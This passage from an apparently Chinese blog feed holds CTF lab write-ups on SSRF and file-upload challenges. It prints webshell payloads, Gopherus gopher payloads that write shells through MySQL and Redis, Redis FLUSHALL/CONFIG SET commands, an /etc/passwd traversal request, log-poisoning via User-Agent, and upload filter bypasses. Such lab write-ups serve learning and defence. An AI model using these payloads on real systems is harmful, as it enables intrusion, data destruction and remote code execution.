class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><br>url=http://ctf.@127.0.0.1/flag.php#show<br><br>url=http://ctf.@127.0.0.1/flag.php?show<br><br></code></pre></td></tr></table></figure><h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><h4 id="SSRF攻击利用Gopher协议实现MySQL写入WebShell"><a href="#SSRF攻击利用Gopher协议实现MySQL写入WebShell" class="headerlink" title="SSRF攻击利用Gopher协议实现MySQL写入WebShell"></a>SSRF攻击利用Gopher协议实现MySQL写入WebShell</h4><p>首先分析拿到的PHP代码，存在SSRF漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;returl&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;returl&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|dict/i&quot;</span>,<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">_request</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>有简单的过滤，禁止包含”file”或”dict”的URL</li><li>但未过滤其他危险协议如<code>gopher://</code></li></ol><p><strong>攻击原理与步骤</strong></p><p><strong>第一步：选择Gopher协议绕过过滤</strong></p><p>Gopher协议是一个古老的网络协议，可以用于构造各种网络请求。由于代码没有过滤gopher协议，我们可以利用它来与MySQL服务器进行交互。</p><p><strong>第二步：使用Gopherus工具生成Payload</strong></p><p>Gopherus是一款专门生成Gopher协议Payload的工具，可以用于攻击多种服务，包括MySQL。</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python gopherus.py --exploit mysql<br></code></pre></td></tr></table></figure><p>输入MySQL命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">root<br>select &#x27;&lt;?php eval($_POST[&#x27;<span class="hljs-built_in">cmd</span>&#x27;]);?&gt;&#x27; into outfile &#x27;/var/www/html/<span class="hljs-built_in">cmd</span>.php&#x27;;<br></code></pre></td></tr></table></figure><p><strong>第三步：理解MySQL协议交互</strong></p><p>Gopherus生成的Payload实际上模拟了MySQL客户端与服务器的完整认证和查询过程：</p><ol><li><strong>TCP三次握手</strong>：建立与MySQL服务器的连接</li><li><strong>协议握手</strong>：服务器发送初始握手包，客户端响应认证信息</li><li><strong>认证过程</strong>：使用提供的用户名(此处为root)进行认证</li><li><strong>查询执行</strong>：发送SQL查询语句select…</li></ol><p><strong>第四步：理解SELECT…INTO OUTFILE</strong></p><ul><li><code>SELECT &#39;&#39;</code>：选择一个空字符串</li><li><code>INTO OUTFILE &#39;/var/www/html/cmd.php&#39;</code>：将结果写入指定文件</li><li>这会在Web目录中创建一个名为<code>cmd.php</code>的文件，内容为空</li></ul><p><strong>第五步：URL编码的重要性</strong></p><p>Gopher协议要求特殊字符进行URL编码，因为：</p><ol><li>Gopher协议使用特定字符作为分隔符（如Tab字符<code>%09</code>）</li><li>某些字符在URL中有特殊含义，需要编码避免解析错误，后面的%会进行URL解码</li><li>MySQL协议中包含二进制数据，必须正确编码</li></ol><p><strong>第六步：完整的攻击流程</strong></p><ol><li><p>使用Gopherus生成Payload</p></li><li><p>对Payload进行URL编码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">gopher://127.0.0.1:3306/<span class="hljs-title">_</span>%<span class="hljs-title">a3</span>%00%00%01%85%<span class="hljs-title">a6</span>%<span class="hljs-title">ff</span>%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%</span><br></code></pre></td></tr></table></figure><p>只对 _ 后面部分进行url编码</p></li><li><p>通过POST请求发送到漏洞端点：<code>returl=gopher%3A%2F%2F...</code>（编码后的内容）</p><p><img src="/../images/04013c66533b3d3349459ead8ee70398.png" alt="04013c66533b3d3349459ead8ee70398"></p></li><li><p>服务器执行SSRF请求，连接到MySQL服务器并执行SQL语句</p><p>成功时，url&#x2F;bit.php页面如下</p><p><img src="/../images/3e2ff866e06176a7c2e394e1d988e4ef.png" alt="3e2ff866e06176a7c2e394e1d988e4ef"></p></li><li><p>MySQL将WebShell写入Web目录</p></li><li><p>攻击者访问<code>http://target/cmd.php</code>获取Shell</p></li></ol><p><strong>防御措施</strong></p><ol><li>严格限制允许的URL协议（只允许http&#x2F;https）</li><li>使用白名单验证用户输入的URL</li><li>对输出文件路径进行严格限制</li><li>网络隔离，确保数据库服务器不直接暴露给外部</li><li>使用最小权限原则运行数据库服务</li></ol><p>这种攻击成功的关键在于SSRF漏洞与MySQL的<code>INTO OUTFILE</code>功能结合，允许攻击者向Web目录写入任意文件，从而获得远程代码执行能力。</p><h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><h4 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python gopherus.py --exploit redis<br><br>Ready To get SHELL<br><br>What <span class="hljs-keyword">do</span> you want?? (ReverseShell/PHPShell): php<br><br>Give web root location of server (default is /var/www/html):<br>Give PHP Payload (We have default PHP Shell): &lt;?php eval($_POST[<span class="hljs-built_in">cmd</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>编码后传参，访问shell.php（默认）即可</p><h4 id="dict协议打redis"><a href="#dict协议打redis" class="headerlink" title="dict协议打redis"></a>dict协议打redis</h4><p>先用info语句测试是否能用dict</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">url<span class="hljs-operator">=</span><span class="hljs-built_in">dict</span><span class="hljs-operator">:</span><span class="hljs-comment">//127.0.0.1:6379/info</span><br></code></pre></td></tr></table></figure><p><img src="/../images/6375128d-bcb4-4588-ab49-722c5d334f43.png" alt="6375128d-bcb4-4588-ab49-722c5d334f43"></p><p>清空数据库</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">dict://127.0.0.1:6379/FLUSHALL<br></code></pre></td></tr></table></figure><p><img src="/../images/d263d3d2-091c-4f61-962c-0f795ac8169e.png" alt="d263d3d2-091c-4f61-962c-0f795ac8169e"></p><p>后面按照格式即可，需url编码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">FLUSHALL //可不写<br><span class="hljs-built_in">SET</span> shell &quot;&lt;?php eval($_POST[&#x27;<span class="hljs-built_in">cmd</span>&#x27;]); ?&gt;&quot; //设置键值对，值为 WebShell<br>CONFIG <span class="hljs-built_in">SET</span> <span class="hljs-built_in">dir</span> /var/www/html //设置保存目录<br>CONFIG <span class="hljs-built_in">SET</span> dbfilename shell.php //设置文件名<br>SAVE //保存<br></code></pre></td></tr></table></figure><p>第二步木马需要用十六进制hex编码，to hex加上\x即可</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">SET:<span class="hljs-title">shell</span>:&quot;\<span class="hljs-title">x3c</span>\<span class="hljs-title">x3f</span>\<span class="hljs-title">x70</span>\<span class="hljs-title">x68</span>\<span class="hljs-title">x70</span>\<span class="hljs-title">x20</span>\<span class="hljs-title">x65</span>\<span class="hljs-title">x76</span>\<span class="hljs-title">x61</span>\<span class="hljs-title">x6c</span>\<span class="hljs-title">x28</span>\<span class="hljs-title">x24</span>\<span class="hljs-title">x5f</span>\<span class="hljs-title">x50</span>\<span class="hljs-title">x4f</span>\<span class="hljs-title">x53</span>\<span class="hljs-title">x54</span>\<span class="hljs-title">x5b</span>\<span class="hljs-title">x27</span>\<span class="hljs-title">x63</span>\<span class="hljs-title">x6d</span>\<span class="hljs-title">x64</span>\<span class="hljs-title">x27</span>\<span class="hljs-title">x5d</span>\<span class="hljs-title">x29</span>\<span class="hljs-title">x3b</span>\<span class="hljs-title">x3f</span>\<span class="hljs-title">x3e</span>&quot; </span><br></code></pre></td></tr></table></figure><p>成功回显：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">-ERR Unknown subcommand or wrong number of arguments for &#x27;libcurl&#x27;. Try CLIENT HELP +OK +OK <br></code></pre></td></tr></table></figure><h2 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h2><p>file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上<br>跳转目录即可读到根目录的文件。(include()函数也有类似的特性）</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ssrf.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(_FILE_);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">httpsssss:<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>此时file_get_contents()函数遇到了不认识的伪协议头，就会把他当作文件夹，然后再配合目录穿越可读取文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">ssrf.php?url=httpsssss://../../../../../../etc/passwd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2025/05/06/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/05/06/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><ul><li><strong>.user.ini 的作用</strong>：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。</li><li><strong>核心指令</strong>：<code>auto_prepend_file</code>（在PHP文件<strong>前</strong>包含）和 <code>auto_append_file</code>（在PHP文件<strong>后</strong>包含）。</li><li><strong>妙用</strong>：利用这个机制，<strong>将一个非PHP格式的文件（如图片）强制作为PHP代码来执行</strong>，从而绕过上传限制。</li><li><strong>关键条件</strong>：<strong>目录下必须有一个可被访问执行的PHP文件</strong>（如index.php）来作为“触发器”。</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=shell.png<br></code></pre></td></tr></table></figure><p>只需上传shell.png(一句话木马),再通过bp改包上传ini即可</p><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><h4 id="关于PHP短标签和分号的说明"><a href="#关于PHP短标签和分号的说明" class="headerlink" title="关于PHP短标签和分号的说明"></a>关于PHP短标签和分号的说明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> ... <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是最原始的短标签形式，可以用来包含任何PHP代码。不过默认是关闭的，需要在 php.ini 文件中将 short_open_tag 设置为 On 才能使用</p><p>在PHP中，短标签<code>&lt;?=</code>是<code>&lt;?php echo</code>的简写形式，用于快速输出内容。</p><p>同153，加了个文件内容过滤了php，可用短标签代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>连接后看见源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<span class="hljs-comment">//获取文件名</span><br>    <span class="hljs-variable">$filesize</span> = (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>);<span class="hljs-comment">//获取文件大小</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filesize</span>&gt;<span class="hljs-number">1024</span>)&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件超过1024KB&quot;</span>);<span class="hljs-comment">//限制文件大小</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>)&#123;<span class="hljs-comment">//检查MIME类型是否为png图像类型</span><br>            <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//获取文件名的信息。</span><br>            <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<span class="hljs-comment">//取出文件的扩展名</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ext_suffix</span>!=<span class="hljs-string">&#x27;php&#x27;</span>)&#123;<br>                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<span class="hljs-comment">//获取文件上传的内容</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;php&quot;</span>)==<span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-comment">//弱比较</span><br>                    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<span class="hljs-comment">//如果内容中不包含php，则成功上传</span><br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">3</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件内容不合规&quot;</span>);<br>                &#125;<br>                <br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>            &#125;<br>    <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>    &#125;<br>    <br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br></code></pre></td></tr></table></figure><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>web155和web154的区别在于upload.php对于字符检测所使用的函数不同 两段代码的主要差异在于检查文件内容是否包含“php”字符串时使用的函数：154代码使用 <em>strrpos($content, “php”) &#x3D;&#x3D; FALSE：</em> strrpos 查找字符串中“php”最后一次出现的位置（区分大小写），返回位置索引或 FALSE。 如果文件内容中包含“php”（如 &lt;?php），strrpos 返回非 FALSE，导致上传失败，返回错误代码 code&#x3D;&gt;3 和消息“文件内容不合规”。 155代码使用 <em>stripos($content, “php”) &#x3D;&#x3D;&#x3D; FALSE：</em> stripos 类似 strrpos，但不区分大小写，查找“php”第一次出现的位置。 使用严格比较 &#x3D;&#x3D;&#x3D; FALSE，检查是否完全没有找到“php”（如 PHP 或 php）。 如果文件内容包含“php”或“PHP”，上传失败，返回错误代码 code&#x3D;&gt;2 和消息“文件类型不合规”。 如果154使用php短标签，则可以通杀这道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;php&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-comment">//强比较</span><br>                   <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br></code></pre></td></tr></table></figure><p><img src="/../images/02a295ad4b5f52df2811e78b3dc63672.png" alt="02a295ad4b5f52df2811e78b3dc63672"></p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>上传 1.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>提示文件类型不合规,猜测是检测到了敏感字符,发现是过滤了[]</p><p>使用{}绕过</p><p>也可以使用<code>filter_input</code>绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;cmd&#x27;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>过滤了；</p><p>关于短标签分号的使用</p><ol><li><p><strong>如果一个PHP语句是代码块中的最后一个语句，并且它后面紧跟着 ?&gt; 结束标签，那么这个语句末尾的分号 ; 可以被省略。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-string">&quot;Hello World&quot;</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>当有多个表达式需要输出时，需要使用分号分隔</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-variable">$var1</span>; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$var2</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p> 所以这题短标签末尾不用;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;cmd&#x27;</span>))<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>或者换个语句直接输出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac ../flag.*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>绕过（）   可用反引号, 当 PHP 遇到反引号中的内容时,它会尝试将反引号内的字符串作为 shell 命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../flag*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>绕过log和反引号和空格，尝试用日志包含。</p><p>日志包含攻击是一种利用本地文件包含(LFI)漏洞的技术：</p><ol><li>攻击者向服务器发送包含PHP代码的请求</li><li>服务器将这些请求记录到日志文件中</li><li>攻击者利用LFI漏洞包含日志文件</li><li>服务器执行日志文件中的PHP代码，导致远程代码执行</li></ol><p>写法是为了绕过一些简单的字符串过滤，将log和access.log字符串拼接起来。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&#x27;/var/l&#x27;</span>.<span class="hljs-string">&#x27;og/nginx/access.lo&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>加上ua头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个ua请求会被Nginx记录到access.log中，所以access.log文件中就包含了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码。</p><p>直接连接即可</p><p>注意：include后不可加空格，前后引号保持一致。</p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>有真正的图片验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br></code></pre></td></tr></table></figure><p>bp上传时会检测文件头，加上GIF89a即可</p><p><img src="/../images/0f8e0b29-fee8-434b-98c1-849ff859e21b.png" alt="0f8e0b29-fee8-434b-98c1-849ff859e21b"></p><h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><p>过滤了.</p><p>因为\x2e要想被解析成.得在字符串里面使用，只能换方法</p><h4 id="法一：session条件竞争"><a href="#法一：session条件竞争" class="headerlink" title="法一：session条件竞争"></a>法一：session条件竞争</h4><p>因为没办法用. 想到session在临时目录下不需要.  php中唯一能控制的无后缀的只有session文件</p><p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p><p>因为<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>上传完成后，会清空session中的内容，所以要利用条件竞争，不断上传，不断访问</p><p>先正常上传user.ini</p><p><img src="/../images/52f22e53866051c2e73ef58809f8a8e9.png" alt="52f22e53866051c2e73ef58809f8a8e9"></p><p>上传文件，名字为1</p><p><img src="/../images/881f5bde9c030408a38679a8351a72f6.png" alt="881f5bde9c030408a38679a8351a72f6"></p><p>写条件竞争脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> re<br><br>session = requests.session()<br>sess = <span class="hljs-string">&#x27;abc&#x27;</span>  <span class="hljs-comment"># 